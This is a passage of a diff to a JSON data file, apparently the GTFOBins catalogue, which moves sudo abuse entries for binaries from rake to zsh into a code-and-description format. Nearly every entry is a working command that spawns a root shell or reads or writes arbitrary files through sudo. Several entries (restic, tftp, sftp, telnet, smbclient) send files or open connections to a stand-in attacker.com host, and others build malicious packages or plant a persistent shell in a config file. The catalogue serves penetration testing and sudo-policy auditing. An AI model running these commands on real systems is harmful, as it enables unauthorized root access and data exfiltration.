-        "sudo rake -p '`/bin/sh 1>&0`'"
+        {
+            "code": "sudo rake -p '`/bin/sh 1>&0`'"
+        }
     ],
     "rc": [
-        "sudo rc -c '/bin/sh'"
+        {
+            "code": "sudo rc -c '/bin/sh'"
+        }
     ],
     "readelf": [
-        "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
+        }
     ],
     "red": [
-        "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
+        {
+            "code": "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
+        }
     ],
     "redcarpet": [
-        "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
+        }
     ],
     "restic": [
-        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+        {
+            "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+        }
     ],
     "rev": [
-        "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
+        {
+            "code": "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
+        }
     ],
     "rlwrap": [
-        "sudo rlwrap /bin/sh"
+        {
+            "code": "sudo rlwrap /bin/sh"
+        }
     ],
     "rpm": [
-        "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
-        "sudo rpm -ivh x-1.0-1.noarch.rpm\n"
+        {
+            "code": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
+        },
+        {
+            "code": "sudo rpm -ivh x-1.0-1.noarch.rpm\n",
+            "description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n"
+        }
     ],
     "rpmdb": [
-        "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
+        {
+            "code": "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
+        }
     ],
     "rpmquery": [
-        "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
+        {
+            "code": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
+        }
     ],
     "rpmverify": [
-        "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
+        {
+            "code": "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
+        }
     ],
     "rsync": [
-        "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+        {
+            "code": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+        }
     ],
     "ruby": [
-        "sudo ruby -e 'exec \"/bin/sh\"'"
+        {
+            "code": "sudo ruby -e 'exec \"/bin/sh\"'"
+        }
     ],
     "run-mailcap": [
-        "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
+        {
+            "code": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "run-parts": [
-        "sudo run-parts --new-session --regex '^sh$' /bin"
+        {
+            "code": "sudo run-parts --new-session --regex '^sh$' /bin"
+        }
     ],
     "runscript": [
-        "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
+        {
+            "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
+        }
     ],
     "rview": [
-        "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
+        {
+            "code": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
+        },
+        {
+            "code": "sudo rview -c ':lua os.execute(\"reset; exec sh\")'",
+            "description": "This requires that `rview` is compiled with Lua support."
+        }
     ],
     "rvim": [
-        "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
+        {
+            "code": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
+        },
+        {
+            "code": "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'",
+            "description": "This requires that `rvim` is compiled with Lua support."
+        }
     ],
     "sash": [
-        "sudo sash"
+        {
+            "code": "sudo sash"
+        }
     ],
     "scanmem": [
-        "sudo scanmem\nshell /bin/sh\n"
+        {
+            "code": "sudo scanmem\nshell /bin/sh\n"
+        }
     ],
     "scp": [
-        "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
+        {
+            "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
+        }
     ],
     "screen": [
-        "sudo screen"
+        {
+            "code": "sudo screen"
+        }
     ],
     "script": [
-        "sudo script -q /dev/null"
+        {
+            "code": "sudo script -q /dev/null"
+        }
     ],
     "scrot": [
-        "sudo scrot -e /bin/sh"
+        {
+            "code": "sudo scrot -e /bin/sh"
+        }
     ],
     "sed": [
-        "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
+        {
+            "code": "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
+            "description": "GNU version only. Also, this requires `bash`."
+        }
     ],
     "service": [
-        "sudo service ../../bin/sh"
+        {
+            "code": "sudo service ../../bin/sh"
+        }
     ],
     "setarch": [
-        "sudo setarch $(arch) /bin/sh"
+        {
+            "code": "sudo setarch $(arch) /bin/sh"
+        }
     ],
     "setfacl": [
-        "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
+        {
+            "code": "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
+        }
     ],
     "setlock": [
-        "sudo setlock - /bin/sh"
+        {
+            "code": "sudo setlock - /bin/sh"
+        }
     ],
     "sftp": [
-        "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
+        {
+            "code": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
+        }
     ],
     "sg": [
-        "sudo sg root\n"
+        {
+            "code": "sudo sg root\n"
+        }
     ],
     "shuf": [
-        "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n",
+            "description": "The written file content is corrupted by adding a newline."
+        }
     ],
     "slsh": [
-        "sudo slsh -e 'system(\"/bin/sh\")'"
+        {
+            "code": "sudo slsh -e 'system(\"/bin/sh\")'"
+        }
     ],
     "smbclient": [
-        "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
+        {
+            "code": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
+        }
     ],
     "snap": [
-        "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n"
+        {
+            "code": "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n",
+            "description": "It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nCOMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\n```\n"
+        }
     ],
     "socat": [
-        "sudo socat stdin exec:/bin/sh\n"
+        {
+            "code": "sudo socat stdin exec:/bin/sh\n",
+            "description": "The resulting shell is not a proper TTY shell and lacks the prompt."
+        }
     ],
     "soelim": [
-        "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
+        }
     ],
     "softlimit": [
-        "sudo softlimit /bin/sh"
+        {
+            "code": "sudo softlimit /bin/sh"
+        }
     ],
     "sort": [
-        "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
+        }
     ],
     "split": [
-        "sudo split --filter=/bin/sh /dev/stdin\n"
+        {
+            "code": "sudo split --filter=/bin/sh /dev/stdin\n",
+            "description": "The shell prompt is not printed."
+        }
     ],
     "sqlite3": [
-        "sudo sqlite3 /dev/null '.shell /bin/sh'"
+        {
+            "code": "sudo sqlite3 /dev/null '.shell /bin/sh'"
+        }
     ],
     "sqlmap": [
-        "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
+        {
+            "code": "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
+        }
     ],
     "ss": [
-        "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
+        }
     ],
     "ssh": [
-        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
+        {
+            "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
+            "description": "Spawn interactive root shell through ProxyCommand option."
+        }
     ],
     "ssh-agent": [
-        "sudo ssh-agent /bin/"
+        {
+            "code": "sudo ssh-agent /bin/"
+        }
     ],
     "ssh-keygen": [
-        "sudo ssh-keygen -D ./lib.so"
+        {
+            "code": "sudo ssh-keygen -D ./lib.so",
+            "description": ""
+        }
     ],
     "ssh-keyscan": [
-        "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
+        }
     ],
     "sshpass": [
-        "sudo sshpass /bin/sh"
+        {
+            "code": "sudo sshpass /bin/sh"
+        }
     ],
     "start-stop-daemon": [
-        "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
+        {
+            "code": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
+        }
     ],
     "stdbuf": [
-        "sudo stdbuf -i0 /bin/sh"
+        {
+            "code": "sudo stdbuf -i0 /bin/sh"
+        }
     ],
     "strace": [
-        "sudo strace -o /dev/null /bin/sh"
+        {
+            "code": "sudo strace -o /dev/null /bin/sh"
+        }
     ],
     "strings": [
-        "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
+        }
     ],
     "su": [
-        "sudo su"
+        {
+            "code": "sudo su"
+        }
     ],
     "sysctl": [
-        "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+        {
+            "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+        }
     ],
     "systemctl": [
-        "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
-        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
-        "sudo systemctl\n!sh\n"
+        {
+            "code": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n"
+        },
+        {
+            "code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n"
+        },
+        {
+            "code": "sudo systemctl\n!sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "systemd-resolve": [
-        "sudo systemd-resolve --status\n!sh\n"
+        {
+            "code": "sudo systemd-resolve --status\n!sh\n",
+            "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
+        }
     ],
     "tac": [
-        "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
+        }
     ],
     "tail": [
-        "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
+        }
     ],
     "tar": [
-        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+        {
+            "code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+        }
     ],
     "task": [
-        "sudo task execute /bin/sh"
+        {
+            "code": "sudo task execute /bin/sh"
+        }
     ],
     "taskset": [
-        "sudo taskset 1 /bin/sh"
+        {
+            "code": "sudo taskset 1 /bin/sh"
+        }
     ],
     "tasksh": [
-        "sudo tasksh\n!/bin/sh\n"
+        {
+            "code": "sudo tasksh\n!/bin/sh\n"
+        }
     ],
     "tbl": [
-        "LFILE=file_to_read\nsudo tbl $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo tbl $LFILE\n"
+        }
     ],
     "tclsh": [
-        "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+        {
+            "code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+        }
     ],
     "tcpdump": [
-        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
+        {
+            "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
+        }
     ],
     "tdbtool": [
-        "sudo tdbtool\n! /bin/sh\n"
+        {
+            "code": "sudo tdbtool\n! /bin/sh\n"
+        }
     ],
     "tee": [
-        "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
+        }
     ],
     "telnet": [
-        "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
+        {
+            "code": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n",
+            "description": "BSD version only. Needs to be connected first."
+        }
     ],
     "terraform": [
-        "sudo terraform console\nfile(\"file_to_read\")\n"
+        {
+            "code": "sudo terraform console\nfile(\"file_to_read\")\n"
+        }
     ],
     "tex": [
-        "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
+        {
+            "code": "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
+        }
     ],
     "tftp": [
-        "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
+        {
+            "code": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n",
+            "description": "Send local file to a TFTP server."
+        }
     ],
     "tic": [
-        "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
+        }
     ],
     "time": [
-        "sudo /usr/bin/time /bin/sh"
+        {
+            "code": "sudo /usr/bin/time /bin/sh"
+        }
     ],
     "timedatectl": [
-        "sudo timedatectl list-timezones\n!/bin/sh\n"
+        {
+            "code": "sudo timedatectl list-timezones\n!/bin/sh\n"
+        }
     ],
     "timeout": [
-        "sudo timeout --foreground 7d /bin/sh"
+        {
+            "code": "sudo timeout --foreground 7d /bin/sh"
+        }
     ],
     "tmate": [
-        "sudo tmate -c /bin/sh"
+        {
+            "code": "sudo tmate -c /bin/sh"
+        }
     ],
     "tmux": [
-        "sudo tmux"
+        {
+            "code": "sudo tmux"
+        }
     ],
     "top": [
-        "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
+        {
+            "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n",
+            "description": "This requires that the root configuration file is writable and might be used to persist elevated privileges."
+        }
     ],
     "torify": [
-        "sudo torify /bin/sh"
+        {
+            "code": "sudo torify /bin/sh"
+        }
     ],
     "torsocks": [
-        "sudo torsocks /bin/sh"
+        {
+            "code": "sudo torsocks /bin/sh"
+        }
     ],
     "troff": [
-        "LFILE=file_to_read\nsudo troff $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo troff $LFILE\n"
+        }
     ],
     "ul": [
-        "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
+        }
     ],
     "unexpand": [
-        "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
+        }
     ],
     "uniq": [
-        "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
+        }
     ],
     "unshare": [
-        "sudo unshare /bin/sh"
+        {
+            "code": "sudo unshare /bin/sh"
+        }
     ],
     "unsquashfs": [
-        "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
+        {
+            "code": "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
+        }
     ],
     "unzip": [
-        "sudo unzip -K shell.zip\n./sh -p\n"
+        {
+            "code": "sudo unzip -K shell.zip\n./sh -p\n"
+        }
     ],
     "update-alternatives": [
-        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
+        {
+            "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n",
+            "description": "Write in `$LFILE` a symlink to `$TF`."
+        }
     ],
     "uudecode": [
-        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        {
+            "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        }
     ],
     "uuencode": [
-        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        {
+            "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
+        }
     ],
     "vagrant": [
-        "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
+        {
+            "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
+        }
     ],
     "valgrind": [
-        "sudo valgrind /bin/sh"
+        {
+            "code": "sudo valgrind /bin/sh"
+        }
     ],
     "vi": [
-        "sudo vi -c ':!/bin/sh' /dev/null"
+        {
+            "code": "sudo vi -c ':!/bin/sh' /dev/null"
+        }
     ],
     "view": [
-        "sudo view -c ':!/bin/sh'",
-        "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
+        {
+            "code": "sudo view -c ':!/bin/sh'"
+        },
+        {
+            "code": "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
+        },
+        {
+            "code": "sudo view -c ':lua os.execute(\"reset; exec sh\")'",
+            "description": "This requires that `view` is compiled with Lua support."
+        }
     ],
     "vigr": [
-        "sudo vigr"
+        {
+            "code": "sudo vigr"
+        }
     ],
     "vim": [
-        "sudo vim -c ':!/bin/sh'",
-        "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
+        {
+            "code": "sudo vim -c ':!/bin/sh'"
+        },
+        {
+            "code": "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
+        },
+        {
+            "code": "sudo vim -c ':lua os.execute(\"reset; exec sh\")'",
+            "description": "This requires that `vim` is compiled with Lua support."
+        }
     ],
     "vimdiff": [
-        "sudo vimdiff -c ':!/bin/sh'",
-        "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
+        {
+            "code": "sudo vimdiff -c ':!/bin/sh'"
+        },
+        {
+            "code": "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+            "description": "This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
+        },
+        {
+            "code": "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
+            "description": "This requires that `vimdiff` is compiled with Lua support."
+        }
     ],
     "vipw": [
-        "sudo vipw"
+        {
+            "code": "sudo vipw"
+        }
     ],
     "virsh": [
-        "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
+        {
+            "code": "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
+        }
     ],
     "w3m": [
-        "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
+        {
+            "code": "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
+        }
     ],
     "wall": [
-        "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
+        }
     ],
     "watch": [
-        "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+        {
+            "code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+        }
     ],
     "wc": [
-        "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
+        }
     ],
     "wget": [
-        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
+        {
+            "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
+        }
     ],
     "whiptail": [
-        "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
+        {
+            "code": "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
+        }
     ],
     "wireshark": [
-        "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n"
+        {
+            "code": "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n",
+            "description": "This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n1. select the only received packet;\n\n2. right-click on \"Data\" from the \"Packet Details\" pane, and select \"Export Packet Bytes...\";\n\n3. choose where to save the packet dump.\n"
+        }
     ],
     "wish": [
-        "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+        {
+            "code": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+        }
     ],
     "xargs": [
-        "sudo xargs -a /dev/null sh"
+        {
+            "code": "sudo xargs -a /dev/null sh",
+            "description": "GNU version only."
+        }
     ],
     "xdg-user-dir": [
-        "sudo xdg-user-dir '}; /bin/sh #'\n"
+        {
+            "code": "sudo xdg-user-dir '}; /bin/sh #'\n"
+        }
     ],
     "xdotool": [
-        "sudo xdotool exec --sync /bin/sh"
+        {
+            "code": "sudo xdotool exec --sync /bin/sh"
+        }
     ],
     "xelatex": [
-        "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
-        "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+        {
+            "code": "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
+            "description": "The read file will be part of the output."
+        },
+        {
+            "code": "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+        }
     ],
     "xetex": [
-        "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
+        {
+            "code": "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
+        }
     ],
     "xmodmap": [
-        "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
+        }
     ],
     "xmore": [
-        "LFILE=file_to_read\nsudo xmore $LFILE\n"
+        {
+            "code": "LFILE=file_to_read\nsudo xmore $LFILE\n"
+        }
     ],
     "xpad": [
-        "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
+        {
+            "code": "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
+        }
     ],
     "xxd": [
-        "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
+        {
+            "code": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
+        }
     ],
     "xz": [
-        "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
+        {
+            "code": "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
+        }
     ],
     "yarn": [
-        "sudo yarn exec /bin/sh"
+        {
+            "code": "sudo yarn exec /bin/sh"
+        }
     ],
     "yash": [
-        "sudo yash"
+        {
+            "code": "sudo yash"
+        }
     ],
     "yum": [
-        "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
-        "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
+        {
+            "code": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
+            "description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n"
+        },
+        {
+            "code": "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n",
+            "description": "Spawn interactive root shell by loading a custom plugin.\n"
+        }
     ],
     "zathura": [
-        "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
+        {
+            "code": "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
+        }
     ],
     "zip": [
-        "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
+        {
+            "code": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
+        }
     ],
     "zsh": [
-        "sudo zsh"
+        {
+            "code": "sudo zsh"
+        }
     ],
     "zsoelim": [
